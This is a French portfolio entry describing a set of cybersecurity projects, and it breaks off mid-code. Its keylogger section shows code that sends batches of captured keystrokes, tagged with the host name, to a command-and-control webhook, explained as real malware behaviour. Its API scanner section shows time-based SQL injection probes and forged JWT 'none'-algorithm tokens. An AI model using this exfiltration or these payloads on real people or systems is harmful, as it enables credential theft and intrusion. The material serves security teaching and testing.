{
  "slug": "cybersecurity-projects",
  "language": "fr",
  "title": "60 Projets de Cybersécurité",
  "subtitle": "Projets de sécurité pratiques pour apprendre, cloner et construire un portfolio",
  "description": "Une collection croissante de 60 projets de cybersécurité allant d'outils CLI débutants à des applications full-stack avancées. 5 projets sont entièrement construits avec code source complet; les 55 restants ont des guides d'implémentation détaillés que je construis activement, également ouverts aux contributeurs. Clonez-les comme templates, étudiez les patterns ou personnalisez pour votre propre portfolio.",
  "tech_stack": [
    "Python",
    "TypeScript",
    "Haskell",
    "Lua",
    "React",
    "SolidJS",
    "FastAPI",
    "Flask",
    "SQLAlchemy",
    "SQLModel",
    "PostgreSQL",
    "SurrealDB",
    "Redis",
    "Docker",
    "Nginx",
    "SCSS",
    "TailwindCSS",
    "Vite"
  ],
  "github_url": "https://github.com/CarterPerez-dev/Cybersecurity-Projects",
  "demo_url": null,
  "website_url": null,
  "docs_url": null,
  "blog_url": null,
  "pypi_url": null,
  "npm_url": null,
  "ios_url": null,
  "android_url": null,
  "code_snippet": null,
  "code_language": null,
  "code_filename": null,
  "thumbnail_url": "project-cyber-projects/thumbnail.webp",
  "banner_url": "project-cyber-projects/banner.webp",
  "screenshots": null,
  "stars_count": 105,
  "forks_count": 11,
  "downloads_count": null,
  "users_count": null,
  "display_order": 2,
  "is_complete": false,
  "is_featured": true,
  "status": "active",
  "start_date": "2025-12-07",
  "end_date": null,
  "technical_details": "## Keylogger\n\n**Catégorie:** Intermédiaire | **Statut:** Complet\n\nUn keylogger éducatif construit pour la recherche en sécurité et la formation aux tests de pénétration. Le projet démontre comment les vrais malwares capturent les identifiants via des hooks clavier, le contexte de fenêtre active et l'exfiltration command-and-control (C2). Ce qui le rend techniquement intéressant est le suivi de fenêtre multiplateforme et la livraison webhook par lots qui simule les patterns de communication APT réels.\n\n### Comment Ça Fonctionne\n\nLe keylogger utilise le modèle événementiel de pynput pour se connecter aux événements clavier au niveau OS. Quand une touche est pressée, elle est traitée en une dataclass `KeyEvent` qui capture l'horodatage, la représentation de la touche et le contexte de fenêtre active. Les événements circulent à travers trois sous-systèmes: `LogManager` gère les E/S fichiers avec rotation automatique, `WebhookDelivery` met en tampon les événements pour livraison C2 par lots, et `WindowTracker` fournit la détection de titre de fenêtre spécifique à la plateforme. Tout est thread-safe avec des verrous protégeant l'état partagé.\n\n```python\n@staticmethod\ndef get_active_window() -> str | None:\n    system = platform.system()\n\n    if system == \"Windows\" and win32gui:\n        return WindowTracker._get_windows_window()\n    if system == \"Darwin\" and NSWorkspace:\n        return WindowTracker._get_macos_window()\n    if system == \"Linux\":\n        return WindowTracker._get_linux_window()\n\n    return None\n\n@staticmethod\ndef _get_windows_window() -> str | None:\n    try:\n        window = win32gui.GetForegroundWindow()\n        _, pid = win32process.GetWindowThreadProcessId(window)\n        process = psutil.Process(pid)\n        window_title = win32gui.GetWindowText(window)\n        return f\"{process.name()} - {window_title}\" if window_title else process.name()\n    except Exception:\n        return None\n```\n\nLe WindowTracker abstrait les différences OS. Windows utilise win32gui avec psutil pour les noms de processus, macOS frappe NSWorkspace, et Linux se connecte à xdotool. Les vérifications de fenêtre sont limitées en taux à des intervalles de 500ms pour éviter de marteler les APIs OS.\n\n### Décisions Techniques\n\n- pynput plutôt que pyHook/keyboard: Support multiplateforme direct sans implémentations Windows/Linux séparées\n- Dataclasses pour KeyEvent et Config: Sérialisation propre en JSON pour payloads webhook, config quasi-immuable\n- Livraison webhook par lots: Les événements se tamponnent jusqu'à ce que la taille du lot (par défaut 50) soit atteinte, imitant les patterns de trafic C2 réels qui évitent le beaconing par frappe\n- Rotation de log par taille: Prévient l'épuisement disque sur les captures de longue durée, tourne à 5MB par défaut\n- Threading.Event pour l'état: Les flags `is_running` et `is_logging` permettent un arrêt propre et une bascule F9 sans conditions de course\n\n```python\ndef _deliver_batch(self) -> None:\n    if not self.event_buffer or not self.config.webhook_url:\n        return\n\n    payload = {\n        \"timestamp\": datetime.now().isoformat(),\n        \"host\": platform.node(),\n        \"events\": [event.to_dict() for event in self.event_buffer]\n    }\n\n    try:\n        response = requests.post(\n            self.config.webhook_url,\n            json = payload,\n            timeout = 5\n        )\n        if response.status_code == 200:\n            self.event_buffer.clear()\n    except Exception as e:\n        logging.error(\"Webhook delivery failed: %s\", e)\n```\n\nLa livraison webhook inclut le nom d'hôte pour l'identification de victime, regroupe les événements en un seul payload, et vide seulement le tampon sur livraison réussie. Les livraisons échouées conservent les événements pour retry, ce qui est comment les vrais malwares maintiennent la persistance à travers les interruptions réseau.\n\n### Stack\nPython 3.13+, pynput, requests, win32gui/psutil (Windows), pyobjc (macOS), xdotool (Linux)\n\n---\n\n## Outil de Recherche DNS\n\n**Catégorie:** Intermédiaire | **Statut:** Complet\n\nUn CLI de requête DNS professionnel qui va au-delà des recherches simples. L'outil effectue des requêtes multi-enregistrements, recherches inverses, traitement par lots et récupération WHOIS avec sortie terminal Rich. La capacité remarquable est la trace DNS, qui visualise le chemin de résolution complet depuis les serveurs racine à travers les serveurs TLD jusqu'aux nameservers autoritaires, montrant exactement comment fonctionne la délégation DNS.\n\n### Comment Ça Fonctionne\n\nLe résolveur utilise les capacités async de dnspython pour interroger plusieurs types d'enregistrement simultanément. Pour les recherches standard, il lance des requêtes parallèles pour chaque type d'enregistrement demandé et agrège les résultats. Pour le traçage, il implémente la résolution itérative manuellement, commençant aux serveurs racine et suivant les références NS dans la hiérarchie jusqu'à atteindre la réponse autoritaire.\n\nLa couche CLI utilise Typer avec intégration Rich pour les spinners de progression pendant les requêtes et les tables de sortie formatées. Les résultats peuvent être exportés en JSON pour scripting ou affichés avec types d'enregistrement color-codés et formatage TTL lisible.\n\n```python\nwhile True:\n    server_name, server_ip = current_servers[0]\n    query = dns.message.make_query(name, rdtype)\n    response = dns.query.udp(query, server_ip, timeout=3.0)\n\n    if response.answer:\n        for rrset in response.answer:\n            for rdata in rrset:\n                result.final_answer = str(rdata)\n        result.hops.append(TraceHop(\n            zone=current_zone, server=server_name,\n            server_ip=server_ip,\n            response=f\"{record_type}: {result.final_answer}\",\n            is_authoritative=True,\n        ))\n        break\n\n    if response.authority:\n        # Extract NS records and follow referrals\n        glue_ips = {str(rrset.name).rstrip(\".\"): rdata.address\n                    for rrset in response.additional\n                    if rrset.rdtype == dns.rdatatype.A\n                    for rdata in rrset}\n```\n\nC'est le cœur de la commande trace. Elle marche manuellement la hiérarchie DNS en envoyant des requêtes à chaque niveau et en suivant les références, gérant les enregistrements glue quand disponibles ou résolvant les IPs nameserver quand non.\n\n### Décisions Techniques\n\n- Choisi résolution itérative plutôt que récursive pour le traçage afin d'exposer la chaîne de délégation réelle plutôt que juste obtenir une réponse finale\n- Utilisé `asyncio.gather` avec `return_exceptions=True` pour gérer gracieusement les échecs partiels dans les recherches par lots sans tuer l'opération entière\n- Implémenté formatage TTL qui s'auto-adapte entre secondes, minutes, heures et jours pour la lisibilité\n- Séparé complètement le formatage de sortie de la logique de résolution, rendant l'export JSON trivial\n\n```python\nasync def batch_lookup(\n    domains: list[str],\n    record_types: list[RecordType] | None = None,\n    nameserver: str | None = None,\n    timeout: float = 5.0,\n) -> list[DNSResult]:\n    tasks = [lookup(domain, record_types, nameserver, timeout) \n             for domain in domains]\n    return await asyncio.gather(*tasks)\n```\n\nLes recherches par lots se déploient simultanément plutôt que séquentiellement, donc interroger 100 domaines prend à peu près le même temps qu'en interroger un.\n\n### Stack\nPython 3.13, dnspython, Typer, Rich, python-whois, pytest, mypy, ruff\n\n---\n\n## Scanner de Sécurité API Full Stack\n\n**Catégorie:** Intermédiaire | **Statut:** Complet\n\nUne plateforme de test de sécurité dockerisée qui scanne les APIs pour les vulnérabilités communes mappées à l'OWASP API Security Top 10. Le scanner orchestre quatre modules spécialisés couvrant la limitation de taux, les failles d'authentification, l'injection SQL et les vulnérabilités IDOR/BOLA. Ce qui le rend techniquement intéressant est l'approche statistique de la détection de vulnérabilité aveugle et la gestion de requêtes sûre en production qui empêche le scanner lui-même de causer des perturbations de service.\n\n### Comment Ça Fonctionne\n\nLe backend suit une architecture en couches avec FastAPI gérant le routage, une couche service orchestrant la logique métier et une couche repository abstrayant les opérations de base de données. Chaque scanner de vulnérabilité hérite d'une classe BaseScanner qui fournit une fonctionnalité HTTP commune incluant l'espacement de requêtes, la logique de retry avec backoff exponentiel et la collecte de preuves. Quand un scan est initié, le ScanService instancie les classes de scanner demandées, les exécute séquentiellement et persiste les résultats via la couche repository.\n\nLes modules scanner implémentent des stratégies de détection distinctes basées sur le type de vulnérabilité. La SQLi basée sur erreur cherche des signatures de base de données dans les réponses. La détection basée sur booléen compare les longueurs de réponse entre conditions injectées vraies et fausses. La détection aveugle basée sur temps établit un temps de réponse baseline en utilisant plusieurs échantillons, puis utilise l'analyse statistique pour identifier les délais causés par les payloads sleep tout en minimisant les faux positifs. Le scanner auth teste l'authentification manquante, l'acceptation d'algorithme none JWT et les contournements de validation de signature.\n\n```python\ndef _test_time_based_sqli(self, delay_seconds: int = 5) -> dict[str, Any]:\n    try:\n        baseline_mean, baseline_stdev = self.get_baseline_timing(\"/\")\n        threshold = baseline_mean + (3 * baseline_stdev)\n        expected_delay_time = baseline_mean + delay_seconds\n\n        delay_payloads = {\n            \"mysql\": [p for p in all_time_payloads if \"SLEEP\" in p],\n            \"postgres\": [p for p in all_time_payloads if \"pg_sleep\" in p],\n            \"mssql\": [p for p in all_time_payloads if \"WAITFOR\" in p],\n        }\n\n        for db_type, payloads in delay_payloads.items():\n            for payload in payloads:\n                delay_times = []\n                for _ in range(3):\n                    response = self.make_request(\"GET\", f\"/?id={payload}\", timeout=delay_seconds + 10)\n                    delay_times.append(getattr(response, \"request_time\", 0.0))\n                    time.sleep(1)\n\n                avg_delay = statistics.mean(delay_times)\n                if avg_delay >= expected_delay_time - 1:\n                    return {\"vulnerable\": True, \"database_type\": db_type, \"confidence\": \"HIGH\" if avg_delay >= expected_delay_time else \"MEDIUM\"}\n```\n\nCette détection SQLi basée sur temps utilise un baseline statistique plutôt que des seuils codés en dur, prenant plusieurs échantillons pour établir la variance de réponse normale avant de tester les payloads délai à travers les variations de syntaxe MySQL, PostgreSQL et MSSQL.\n\n### Décisions Techniques\n\n- Utilisé pattern de classe de base abstraite pour les scanners donc la logique HTTP commune comme limitation de taux et gestion de retry vit en un seul endroit pendant que chaque type de vulnérabilité implémente sa propre stratégie de détection\n- Implémenté espacement de requêtes avec jitter configurable pour éviter de submerger les cibles ou déclencher les limites de taux pendant les scans, calculé dynamiquement basé sur requêtes max et fenêtre de temps\n- Test JWT couvre les variations de casse de l'algorithme none puisque certaines implémentations vérifient seulement les minuscules, plus suppression de signature et acceptation de token malformé\n- Test de contournement de limite de taux inclut usurpation d'en-tête IP via X-Forwarded-For et X-Real-IP, plus variations de chemin endpoint qui contournent parfois les limiteurs de taux sensibles à la casse\n- Frontend utilise Zustand avec immer pour mises à jour d'état immuables et middleware de persistance pour préserver l'état du formulaire à travers les sessions avec expiration automatique après sept jours\n- Les guards de type valident toutes les réponses API à l'exécution avant que les données n'entrent dans l'état applicatif, détectant tôt les violations de contrat backend\n\n```python\ndef _test_none_algorithm(self) -> dict[str, Any]:\n    try:\n        header, payload, signature = self.auth_token.split(\".\")\n        none_variants = AuthPayloads.get_jwt_none_variants()  # [\"none\", \"None\", \"NONE\", \"nOnE\", ...]\n\n        for variant in none_variants:\n            malicious_header = self._base64url_encode(json.dumps({\"alg\": variant, \"typ\": \"JWT\"}))\n            malicious_token = f\"{malicious_header}.{payload}.\"\n\n            response = self.make_request(\"GET\", \"/\", headers={\"Authorization\": f\"Bearer {malicious_token}\"})\n            if response.status_code == 200:\n                return {\"vulnerable\": True, \"vulnerability_type\": \"JWT None Algorithm\", \"algorithm_variant\": variant}\n\n        return {\"vulnerable\": False, \"description\": \"None algorithm properly rejected\"}\n    except Exception as e:\n        return {\"vulnerable\": False, \"error\": str(e)}\n```\n\nLe test d'algorithme none JWT construit des tokens avec diverses permutations de casse de \"none\" comme algorithme, supprime la signature et vérifie si l'API les accepte. Un endpoint vulnérable retournerait 200, indiquant qu'il traite les tokens non signés.\n\n### Stack\nPython, FastAPI, SQLAlchemy, PostgreSQL, React, TypeScript, Zustand, TanStack Query, Docker, Nginx\n\n---\n\n## FastAPI-420 (Limiteur de Taux API)\n\n**Catégorie:** Avancé | **Statut:** Complet\n\nUne bibliothèque de limitation de taux de niveau production pour FastAPI qui implémente un système de défense à trois couches contre l'abus API et les attaques DDoS. Le \"420\" dans le nom référence l'ancien code de réponse HTTP 420 \"Enhance Your Calm\" de Twitter, que la bibliothèque ressuscite au lieu du standard 429. Ce qui rend ceci techniquement intéressant est la convergence de plusieurs problèmes difficiles: compteurs distribués atomiques via scripts Lua, empreinte digitale client sophistiquée qui tient compte de l'exploitation du préfixe IPv6 /64, un pattern circuit breaker avec plusieurs modes de défense, et une couche d'abstraction propre qui vous laisse échanger algorithmes et backends de stockage sans toucher au code applicatif. Le tout est typé de bout en bout avec protocoles vérifiables à l'exécution et livré avec à la fois un middleware bloquant et une variante \"slow down\" qui ajoute des délais progressifs au lieu de rejets durs.\n\n### Comment Ça Fonctionne\n\nL'architecture opère sur trois couches défensives que les requêtes doivent traverser séquentiellement. La couche 1 gère la limitation par utilisateur par endpoint utilisant des empreintes composites construites depuis adresses IP, user agents, tokens d'authentification et optionnellement empreintes TLS et ordre d'en-têtes. La couche 2 protège les endpoints individuels d'être submergés en appliquant des limites globales par route, donc un seul endpoint ne peut pas consumer toute la capacité disponible. La couche 3 est un circuit breaker qui surveille le trafic API total et peut basculer en différents modes de défense quand les seuils sont dépassés.\n\nLe coordinateur de défense en couches traite les requêtes à travers les trois couches et lève une exception `EnhanceYourCalm` (HTTP 420) au premier échec. Chaque couche construit sa propre clé de limite de taux utilisant un format structuré: `{prefix}:{version}:{layer}:{endpoint}:{identifier}:{window}`. Cette structure de clé signifie que vous pouvez inspecter Redis directement pendant le débogage et comprendre immédiatement ce que vous regardez.\n\n```python\nasync def check_all_layers(\n    self,\n    request: Request,\n    fingerprint: FingerprintData,\n    endpoint: str,\n    rules: list[RateLimitRule],\n) -> RateLimitResult:\n    \"\"\"\n    Check all defense layers in order\n    \"\"\"\n    context = DefenseContext(\n        fingerprint = fingerprint,\n        endpoint = endpoint,\n        method = request.method,\n        is_authenticated = fingerprint.auth_identifier is not None,\n    )\n\n    layer3_result = await self._check_layer3_global(context)\n    if not layer3_result.allowed:\n        self._log_violation(layer3_result, context)\n        raise EnhanceYourCalm(\n            result = layer3_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = \"API is under heavy load. Please try again later.\",\n        )\n\n    layer2_result = await self._check_layer2_endpoint(context, rules)\n    if not layer2_result.allowed:\n        self._log_violation(layer2_result, context)\n        raise EnhanceYourCalm(\n            result = layer2_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    layer1_result = await self._check_layer1_user(context, rules)\n    if not layer1_result.allowed:\n        self._log_violation(layer1_result, context)\n        raise EnhanceYourCalm(\n            result = layer1_result.result,\n            message = self._settings.HTTP_420_MESSAGE,\n            detail = self._settings.HTTP_420_DETAIL,\n        )\n\n    return layer1_result.result\n```\n\nLe système de défense en couches court-circuite au premier échec, vérifiant la santé globale avant de gaspiller des cycles sur des recherches par utilisateur. Le contexte de défense porte l'état d'authentification et les scores de réputation que les couches en aval peuvent utiliser pour prendre des décisions de contournement.\n\nLe stockage est abstrait derrière une interface de protocole avec deux implémentations: Redis pour déploiements distribués et en mémoire pour instance unique ou développement. Le backend Redis précharge les scripts Lua au démarrage et les exécute via EVALSHA pour garantir l'atomicité sans retransmettre les corps de script à chaque appel. Si Redis retourne NOSCRIPT (scripts évincés du cache), le backend recharge et réessaie automatiquement.\n\nLa bibliothèque supporte quatre algorithmes de limitation de taux qui implémentent tous la même classe abstraite `BaseAlgorithm`: fenêtre glissante utilise l'interpolation pondérée entre deux fenêtres fixes pour environ 99.997% de précision avec mémoire O(1) par client; token bucket permet le bursting contrôlé jusqu'à la capacité du bucket tout en appliquant des taux moyens; fenêtre fixe est plus simple mais souffre du problème de burst de frontière; leaky bucket est aliasé à fenêtre glissante puisque les implémentations sont fonctionnellement équivalentes pour la plupart des cas d'usage.\n\n```lua\n--[[\nsliding_window.lua\nAtomic sliding window counter rate limiting.\nReturns: {allowed (0/1), remaining, reset_after}\n--]]\n\nlocal key = KEYS[1]\nlocal window_seconds = tonumber(ARGV[1])\nlocal limit = tonumber(ARGV[2])\nlocal now = tonumber(ARGV[3])\n\nlocal current_window = math.floor(now / window_seconds)\nlocal previous_window = current_window - 1\nlocal elapsed_ratio = (now % window_seconds) / window_seconds\n\nlocal current_key = key .. \":\" .. current_window\nlocal previous_key = key .. \":\" .. previous_window\n\nlocal current_count = tonumber(redis.call('GET', current_key)) or 0\nlocal previous_count = tonumber(redis.call('GET', previous_key)) or 0\n\nlocal weighted_count = math.floor(previous_count * (1 - elapsed_ratio) + current_count)\nlocal reset_after = window_seconds - (now % window_seconds)\n\nif weighted_count >= limit then\n    return {0, 0, reset_after, reset_after}\nend\n\nredis.call('INCR', current_key)\nredis.call('EXPIRE', current_key, window_seconds * 2)\n\nlocal new_weighted = math.floor(previous_count * (1 - elapsed_ratio) + current_count + 1)\nlocal remaining = math.max(0, limit - new_weighted)\n\nreturn {1, remaining, reset_after, 0}\n```\n\nLe script Lua de fenêtre glissante s'exécute atomiquement dans Redis. La formule d'interpolation pondérée `previous_count * (1 - elapsed_ratio) + current_count` transite en douceur entre les fenêtres, éliminant la vulnérabilité de burst de frontière où les attaquants pourraient faire 2x la limite en temporisant les requêtes aux bords de fenêtre. Les clés expirent après 2x la durée de fenêtre pour assurer que la fenêtre précédente est toujours disponible pour le calcul.\n\nLe système d'empreinte digitale est où ça devient particulièrement intéressant. Plutôt que de se fier uniquement aux adresses IP, le `CompositeFingerprinter` construit des identifiants depuis plusieurs signaux basés sur des niveaux d'intensité configurables. Le mode strict utilise tout: IP, user agent, en-têtes accept, ordre d'en-têtes, tokens auth, empreintes TLS/JA3 et ASN géographique. Le mode normal (par défaut) utilise IP, user agent et auth. Le mode relaxé utilise juste IP et auth pour compatibilité maximale.\n\n```python\nclass CompositeFingerprinter:\n    \"\"\"\n    Combines multiple fingerprinting methods based on configuration\n\n    Preset levels determine which extractors are used:\n    - strict: All methods (IP, headers, auth, TLS, geo)\n    - normal: IP + User-Agent + Auth (default)\n    - relaxed: IP + Auth only\n    - custom: Configured via settings\n    \"\"\"\n    def __init__(\n        self,\n        level: FingerprintLevel = FingerprintLevel.NORMAL,\n        ip_extractor: IPExtractor | None = None,\n        headers_extractor: HeadersExtractor | None = None,\n        auth_extractor: AuthExtractor | None = None,\n        use_ip: bool = True,\n        use_user_agent: bool = True,\n        use_accept_headers: bool = False,\n        use_header_order: bool = False,\n        use_auth: bool = True,\n        use_tls: bool = False,\n        use_geo: bool = False,\n    ) -> None:\n        self.level = level\n        self._ip_extractor = ip_extractor or IPExtractor()\n        self._headers_extractor = headers_extractor or HeadersExtractor(\n            use_header_order = use_header_order,\n        )\n        self._auth_extractor = auth_extractor or AuthExtractor()\n\n        if level == FingerprintLevel.STRICT:\n            self.use_ip = True\n            self.use_user_agent = True\n            self.use_accept_headers = True\n            self.use_header_order = True\n            self.use_auth = True\n            self.use_tls = True\n            self.use_geo = True\n        elif level == FingerprintLevel.RELAXED:\n            self.use_ip = True\n            self.use_user_agent = False\n            self.use_accept_headers = False\n            self.use_header_order = False\n            self.use_auth = True\n            self.use_tls = False\n            self.use_geo = False\n        # ... continues for other levels\n```\n\nL'ordre des en-têtes est particulièrement astucieux pour l'empreinte digitale parce que c'est spécifique au navigateur et non configurable par l'utilisateur. Chrome, Firefox et Safari envoient tous les en-têtes dans des ordres différents, donc même si un attaquant usurpe une chaîne user agent, l'ordre des en-têtes trahit souvent le vrai client.\n\nPour les clients IPv6, les adresses brutes sont normalisées à leur préfixe réseau /64. C'est important parce que les utilisateurs résidentiels et mobiles contrôlent typiquement des blocs /64 entiers (environ 18 quintillions d'adresses), rendant la limitation de taux naïve par IP complètement inefficace. Un attaquant pourrait trivialement tourner à travers les adresses dans leur allocation. La normalisation collapse toutes les adresses dans un /64 à l'adresse réseau, les traitant comme une seule identité.\n\n```python\ndef _normalize_ip(self, ip_str: str) -> str:\n    \"\"\"\n    Normalize IP address for rate limiting\n\n    IPv6 addresses are normalized to their /64 network prefix\n    since users typically control entire /64 blocks.\n    \"\"\"\n    try:\n        addr = ip_address(ip_str)\n    except ValueError:\n        return ip_str\n\n    if isinstance(addr, IPv6Address):\n        if addr.ipv4_mapped:\n            return str(addr.ipv4_mapped)\n\n        network = ip_network(\n            f\"{ip_str}/{self.ipv6_prefix_length}\",\n            strict = False,\n        )\n        return str(network.network_address)\n\n    return str(addr)\n```\n\nL'extracteur d'authentification implémente une chaîne de repli: claim sujet JWT d'abord, puis en-tête clé API, puis paramètre de requête clé API, puis cookie de session. Le parsing JWT fonctionne avec ou sans vérification secrète puisque la bibliothèque a seulement besoin d'identité pour la limitation de taux, pas l'autorisation. Quand un secret n'est pas configuré, il extrait le claim sujet sans validation, ce qui est sûr parce que la clé de limite de taux est juste un identifiant de bucket, pas une décision de confiance.\n\n### Décisions Techniques\n\n- Choisi fenêtre glissante plutôt que fenêtre fixe pure pour éliminer le problème de burst de frontière. Avec fenêtres fixes, un attaquant qui fait 100 requêtes à 11:59:59 et encore 100 à 12:00:01 obtient effectivement 200 requêtes en 2 secondes malgré une limite de 100/minute. L'interpolation pondérée transite en douceur entre fenêtres, maintenant des comptes précis indépendamment de quand arrivent les requêtes.\n\n- Utilisé EVALSHA avec hashes de script en cache plutôt que EVAL pour éviter de retransmettre les corps de script Lua à chaque opération Redis. Les scripts sont chargés une fois au démarrage via `script_load` et les hashes SHA1 sont en cache. Si Redis retourne NOSCRIPT (indiquant que les scripts ont été évincés du cache script), le backend attrape l'exception, recharge tous les scripts et réessaie transparently.\n\n- Implémenté normalisation de préfixe IPv6 /64 parce que l'approche standard /128 par adresse est trivialement contournable. La plupart des allocations IPv6 donnent aux utilisateurs au minimum un /64, et beaucoup d'ISPs distribuent des préfixes /56 ou même /48. Le paramètre `ipv6_prefix_length` configurable laisse les opérateurs ajuster ceci pour leur modèle de menace.\n\n- Construit le circuit breaker avec plusieurs modes de défense plutôt que juste ouvert/fermé. Le mode adaptatif permet aux utilisateurs authentifiés de passer quand le circuit se déclenche, maintenant le service pour les utilisateurs légitimes pendant les attaques. Le mode lockdown restreint le trafic aux clients avec scores de réputation élevés. L'état demi-ouvert permet le test de récupération graduel avant de fermer complètement le circuit.\n\n- Le système d'empreinte digitale utilise l'ordre des en-têtes comme signal anti-usurpation. Les navigateurs envoient les en-têtes dans des ordres déterministes mais spécifiques au navigateur que les utilisateurs ne peuvent pas changer. Même si un attaquant définit une chaîne user agent Chrome, leur ordre d'en-têtes pourrait révéler qu'ils utilisent réellement curl ou un script Python.\n\n- Le stockage mémoire utilise `OrderedDict` avec éviction LRU pour borner l'utilisation mémoire. Quand le max de clés est dépassé, les entrées les plus anciennes (par temps d'accès) sont évincées en premier. Une tâche asyncio en arrière-plan nettoie périodiquement les entrées expirées pour prévenir les fuites mémoire des buckets de limite de taux abandonnés.\n\n- Le système d'injection de dépendances fournit plusieurs patterns d'intégration: un décorateur `@limiter.limit()` pour limites au niveau route, une classe `RateLimitDep` qui fonctionne avec le `Depends()` de FastAPI, un `ScopedRateLimiter` pour appliquer différentes règles à des groupes de routes, et un middleware complet pour couverture globale. Cette flexibilité signifie que la bibliothèque fonctionne indépendamment de comment votre app FastAPI est structurée.\n\n- Construit un `SlowDownMiddleware` alternatif qui ajoute des délais progressifs au lieu de blocs durs. C'est utile pour dégradation graduelle où vous voulez décourager l'abus sans couper complètement les utilisateurs limites. Les incréments de délai sont configurables jusqu'à un maximum.\n\n```python\nclass RateLimitDep:\n    \"\"\"\n    FastAPI dependency for rate limiting\n\n    Usage:\n        @app.get(\"/api/data\", dependencies=[Depends(RateLimitDep(\"100/minute\"))])\n        async def get_data():\n            return {\"data\": \"value\"}\n\n        # Or with result access:\n        @app.get(\"/api/data\")\n        async def get_data(limit_result: Annotated[RateLimitResult, Depends(RateLimitDep(\"100/minute\"))]):\n            return {\"remaining\": limit_result.remaining}\n    \"\"\"\n    def __init__(\n        self,\n        *rules: str,\n        limiter: RateLimiter | None = None,\n        key_func: Callable[[Request], str] | None = None,\n    ) -> None:\n        self.rules = [RateLimitRule.parse(rule) for rule in rules]\n        self._limiter = limiter\n        self.key_func = key_func\n\n    async def __call__(self, request: Request) -> RateLimitResult:\n        \"\"\"\n        Check rate limit and return result\n        \"\"\"\n        rule_strings = [str(rule) for rule in self.rules]\n        return await self.limiter.check(\n            request,\n            *rule_strings,\n            key_func = self.key_func,\n            raise_on_limit = True,\n        )\n```\n\nLa classe dépendance parse les chaînes de règles au temps d'instanciation plutôt qu'à chaque requête, et expose le `RateLimitResult` donc les routes peuvent accéder au quota restant, temps de reset et autres métadonnées pour leur propre logique.\n\n- Utilisé `model_validator` de Pydantic pour validation de configuration avec application spécifique à l'environnement. Les déploiements production nécessitent soit une URL Redis soit reconnaissance explicite que le repli mémoire est acceptable. Les chaînes de limite de taux sont validées au temps de chargement de config donc les règles malformées échouent rapidement plutôt qu'à l'exécution.\n\n- La hiérarchie d'exceptions distingue entre limite de taux dépassée (faute de l'utilisateur), erreurs de stockage (problème d'infrastructure), erreurs de configuration (faute du développeur) et circuit breaker ouvert (protection système). Chaque type d'exception porte des détails structurés pour journalisation et débogage plutôt que juste des chaînes de message.\n\n### Stack\nPython 3.12+, FastAPI, Starlette, Redis, Pydantic, Pydantic Settings, PyJWT, Lua, asyncio, mypy (mode strict), ruff, pylint\n\n---\n\n## Chat P2P Chiffré\n\n**Catégorie:** Avancé | **Statut:** Actif\n\nUne implémentation complète du Signal Protocol pour messagerie chiffrée bout-en-bout, construite de zéro sans raccourcis cryptographiques. Le système implémente X3DH (Extended Triple Diffie-Hellman) pour échange de clés asynchrone et l'algorithme Double Ratchet pour forward secrecy, signifiant que chaque message unique utilise une clé de chiffrement unique dérivée à travers une chaîne d'opérations cryptographiques. L'authentification est entièrement sans mot de passe via passkeys WebAuthn/FIDO2, éliminant complètement les bases de données de credentials.\n\nL'architecture utilise trois bases de données, chacune optimisée pour son rôle spécifique: PostgreSQL gère l'identité utilisateur et le stockage de credentials avec garanties ACID, SurrealDB fournit stockage de documents temps réel avec requêtes live natives pour livraison instantanée de messages, et Redis gère les challenges WebAuthn éphémères avec expiration TTL automatique. Le frontend est construit en SolidJS plutôt que React, utilisant la réactivité fine-grained pour un bundle plus petit et une meilleure performance dans un contexte de messagerie temps réel.\n\n### Comment Ça Fonctionne\n\nLe pipeline de chiffrement commence quand un utilisateur initie une conversation. L'émetteur récupère le bundle prekey du destinataire depuis le serveur, qui contient leur clé d'identité long-terme, une prekey signée moyen-terme (tournée toutes les 48 heures), et optionnellement une prekey à usage unique. Le protocole X3DH effectue quatre opérations Diffie-Hellman entre diverses combinaisons de ces clés et une paire de clés éphémère fraîchement générée, puis dérive un secret partagé via HKDF. Ce secret partagé initialise le Double Ratchet.\n\nUne fois le ratchet initialisé, chaque message déclenche une étape de ratchet de clé symétrique qui dérive une clé de message unique et avance la chaîne. Quand le destinataire répond, une étape de ratchet DH se produit: les deux parties génèrent de nouvelles paires de clés éphémères, effectuent de nouveaux échanges DH et dérivent des clés racine et chaîne entièrement nouvelles. Cela signifie que compromettre une seule clé de message ne révèle rien sur les messages passés ou futurs. L'implémentation gère aussi la livraison hors ordre en cachant les clés de message sautées, bornée par des limites configurables pour prévenir les attaques d'épuisement mémoire.\n\n```python\ndef encrypt_message(\n    self,\n    state: DoubleRatchetState,\n    plaintext: bytes,\n    associated_data: bytes\n) -> EncryptedMessage:\n    \"\"\"\n    Encrypts message and advances sending ratchet\n    \"\"\"\n    state.sending_chain_key, message_key = self._kdf_ck(\n        state.sending_chain_key\n    )\n\n    nonce, ciphertext = self._encrypt_with_message_key(\n        message_key,\n        plaintext,\n        associated_data\n    )\n\n    if state.dh_private_key:\n        dh_public = state.dh_private_key.public_key()\n        dh_public_bytes = dh_public.public_bytes(\n            encoding = serialization.Encoding.Raw,\n            format = serialization.PublicFormat.Raw\n        )\n    else:\n        dh_public_bytes = b'\\x00' * X25519_KEY_SIZE\n\n    encrypted_msg = EncryptedMessage(\n        ciphertext = ciphertext,\n        nonce = nonce,\n        dh_public_key = dh_public_bytes,\n        message_number = state.sending_message_number,\n        previous_chain_length = state.previous_sending_chain_length\n    )\n\n    state.sending_message_number += 1\n    return encrypted_msg\n```\n\nC'est le chemin de chiffrement central. Chaque appel dérive une clé de message fraîche depuis la clé chaîne utilisant HMAC, chiffre avec AES-256-GCM et empaquette la clé publique DH actuelle de l'émetteur dans l'en-tête de message donc le destinataire peut effectuer l'étape de ratchet DH.\n\nLa couche WebSocket maintient des connexions persistantes avec heartbeats automatiques et logique de reconnexion. Quand un message arrive, le système de requête live de SurrealDB le pousse directement au gestionnaire de connexion du destinataire, qui le route vers tous leurs appareils actifs. Le gestionnaire de connexion applique les limites de connexion par utilisateur et gère la dégradation gracieuse quand les connexions meurent.\n\n```python\nasync def connect(self, websocket: WebSocket, user_id: UUID) -> bool:\n    \"\"\"\n    Accept WebSocket connection and register user\n    \"\"\"\n    await websocket.accept()\n\n    if user_id not in self.active_connections:\n        self.active_connections[user_id] = []\n\n    if len(self.active_connections[user_id]) >= WS_MAX_CONNECTIONS_PER_USER:\n        await self._send_error(\n            websocket,\n            \"max_connections\",\n            f\"Maximum {WS_MAX_CONNECTIONS_PER_USER} connections per user\"\n        )\n        await 